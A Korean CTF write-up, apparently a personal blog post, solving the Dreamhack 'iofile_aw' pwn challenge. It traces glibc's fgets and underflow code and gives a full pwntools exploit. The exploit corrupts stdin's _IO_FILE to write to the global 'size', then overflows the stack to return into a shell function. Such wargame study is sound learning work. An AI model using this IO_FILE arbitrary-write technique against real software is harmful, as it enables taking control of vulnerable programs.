---
title: "iofile_aw writeup"
date: 2026-03-20 06:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, io_file, arbitrary_write, dreamhack]
---

드림핵 시스템 해킹 로드맵을 따라가면서 혼자 푸는 문제들 중 배웠던 개념을 바로 적용하기 어려워서 glibc 소스 코드를 직접 분석해야 했던 문제다. 나중에 참고할 겸 풀이 과정을 정리해둔다.

## Analysis

### checksec

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
RUNPATH:    b'.'
Stripped:   No
```

카나리가 없고 PIE도 꺼져 있다.

### Source Code

```c
// gcc -o iofile_aw iofile_aw.c -fno-stack-protector -Wl,-z,relro,-z,now
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char buf[80];

int size = 512;

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void read_str()
{
    fgets(buf, sizeof(buf) - 1, stdin);
}

void get_shell()
{
    system("/bin/sh");
}

void help()
{
    printf("read: Read a line from the standard input and split it into fields.\n");
}

void read_command(char *s)
{
    /*No overflow here */
    int len;
    len = read(0, s, size);
    if (s[len - 1] == '\x0a')
        s[len - 1] = '\0';
}

int main(int argc, char *argv[])
{
    int idx = 0;
    int sel;
    char command[512];
    long *dst = 0;
    long *src = 0;
    memset(command, 0, sizeof(command) - 1);

    initialize();

    while (1)
    {
        printf("# ");
        read_command(command);

        if (!strcmp(command, "read"))
        {
            read_str();
        }
        else if (!strcmp(command, "help"))
        {
            help();
        }
        else if (!strncmp(command, "printf", 6))
        {
            if (strtok(command, " "))
            {
                src = (long*) strtok(NULL, " ");
                dst = (long*) stdin;
                if (src)
                    memcpy(dst, src, 0x40);
            }
        }
        else if (!strcmp(command, "exit"))
        {
            return 0;
        }
        else
        {
            printf("%s: command not found\n", command);
        }
    }
    return 0;
}
```

`printf` 커맨드에서 `stdin` (`_IO_FILE` 구조체)을 `dst`로 고정하고, 사용자 입력값을 `src`로 받아 `memcpy`로 0x40바이트를 복사한다. 즉 `stdin`의 `_IO_FILE` 구조체를 임의로 덮어씌울 수 있다.

`read_command`는 `size`만큼 읽는데, `size`는 전역 변수이므로 이 값을 크게 바꾸면 `command[512]`를 넘어 스택 오버플로우를 일으킬 수 있다. 목표는 `_IO_FILE` 구조체를 조작해 `size`에 임의 쓰기를 수행하는 것이다.

## Vulnerability Analysis

배웠던 IO FILE 공격 기법인 AW, AR, Bypass IO_validate_vtable 중 하나겠거니 싶어서 소스 코드를 봤는데, `memcpy`의 복사 범위가 `_IO_buf_base`까지만 닿고 `_IO_buf_end`는 덮지 못하는 구조였다. 기존에 배운 AW는 `n < _IO_buf_end - _IO_buf_base` 조건을 만족해야 하는데 `_IO_buf_end`를 못 덮으니 뭐지 싶어서 bootlin에서 glibc 소스를 직접 분석했다.

`fgets`는 내부적으로 `_IO_getline_info`를 호출한다.

```c
_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp);
	...

```

`_IO_read_end`와 `_IO_read_ptr`을 동일한 값으로 설정하면 `len`이 0이 되어 `__uflow`로 진입한다. 내부에서 `n < _IO_buf_end - _IO_buf_base`와 같은 조건이 있는지 확인해야 한다.

`__uflow`는 내부적으로 `_IO_new_file_underflow`를 호출한다.

```c
int
_IO_new_file_underflow (_IO_FILE *fp)
{
  ...
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                       fp->_IO_buf_end - fp->_IO_buf_base);
  ...
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

확인해본 결과 fread와 달리 fgets에서는 `n < _IO_buf_end - _IO_buf_base`와 같은 조건이 존재하지 않는다. 따라서 `_IO_buf_end`가 0이어도 문제가 없다.

read 시스템 콜 전에 `_IO_read_base`, `_IO_read_ptr`, `_IO_read_end`, `_IO_write_base`, `_IO_write_ptr`, `_IO_write_end`가 모두 `_IO_buf_base`로 설정된다. `_IO_buf_end`가 0이고 `_IO_buf_base`가 `size`의 주소로 설정되어 있으므로, read 크기로 전달되는 `_IO_buf_end - _IO_buf_base` 값은 음수가 된다. 그러나 `_IO_SYSREAD`는 이 크기에 대한 별도의 검사 없이 그대로 read 시스템 콜에 넘기며, read는 이를 `size_t`로 받기 때문에 문제없이 동작한다. 마지막에 `_IO_read_ptr`에서 1바이트를 읽어 반환하는데, 이 값은 `_IO_buf_base`의 하위 1바이트와 같다.

```c
_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp);
	  if (c == EOF)
	    {
	      if (eof)
		*eof = c;
	      break;
	    }
	  if (c == delim)
	    {
 	      if (extract_delim > 0)
		*ptr++ = c;
	      else if (extract_delim < 0)
		_IO_sputbackc (fp, c);
	      if (extract_delim > 0)
		++len;
	      return ptr - buf;
	    }
	  *ptr++ = c;
	  n--;
	}
      else
	{
	  char *t;
	  if ((_IO_size_t) len >= n)
	    len = n;
	  t = (char *) memchr ((void *) fp->_IO_read_ptr, delim, len);
	  if (t != NULL)
	    {
	      _IO_size_t old_len = ptr-buf;
	      len = t - fp->_IO_read_ptr;
	      if (extract_delim >= 0)
		{
		  ++t;
		  if (extract_delim > 0)
		    ++len;
		}
	      memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	      fp->_IO_read_ptr = t;
	      return old_len + len;
	    }
	  memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	  fp->_IO_read_ptr += len;
	  ptr += len;
	  n -= len;
	}
    }
  return ptr - buf;
}

```

read 시스템 콜 이후 `_IO_getline_info`로 돌아오면 루프를 한 번 더 돈다. 멤버 변수들이 갱신되었으므로 `len`이 입력 길이가 되어 else 분기로 진입한다. `fgets`의 delim은 `'\n'`이므로, 개행이 있으면 `memchr`에서 `'\n'`을 찾아 `return old_len + len;`으로 즉시 탈출한다. 반대로 개행이 없으면 `_IO_read_ptr`이 `_IO_read_end`와 같아지면서 `len`이 다시 0이 되고 `__uflow`로 재진입해 표준 입력 대기 상태가 되어 흐름이 꼬인다. 따라서 입력 끝에 개행을 반드시 붙여야 한다.

## Exploit

`_IO_buf_base`에 `size`의 주소를 넣어 `__uflow` 내부의 read 시스템 콜이 `size` 위치에서 수행되도록 한다. 이때 버퍼 오버플로우가 발생하도록 크기를 지정해 임의 쓰기를 수행하고, 이후 `read_command`에서 스택 오버플로우를 일으켜 16바이트 스택 정렬을 맞추는 ret 가젯을 삽입한 뒤 `get_shell`로 리턴하면 된다.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aw_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 20701)

    return r


def main():
    r = conn()

    payload = p64(0xfbad2488)                               # _flags
    payload += p64(0)                                       # _IO_read_ptr
    payload += p64(0)                                       # _IO_read_end
    payload += p64(0)                                       # _IO_read_base
    payload += p64(0)                                       # _IO_write_base
    payload += p64(0)                                       # _IO_write_ptr
    payload += p64(0)                                       # _IO_write_end
    payload += p64(exe.symbols["size"])                     # _IO_buf_base

    r.sendafter(b"# ", b"printf " + payload + b"\x00")
    r.sendafter(b"# ", b"read\x00")
    sleep(0.5)
    r.send(p64(0x400) + b"\n")

    payload2 = b"A" * 0x228
    payload2 += p64(ROP(exe).find_gadget(["ret"])[0])
    payload2 += p64(exe.symbols["get_shell"])

    r.sendafter(b"# ", payload2)
    r.sendafter(b"# ", b"exit\x00")

    r.interactive()


if __name__ == "__main__":
    main()
```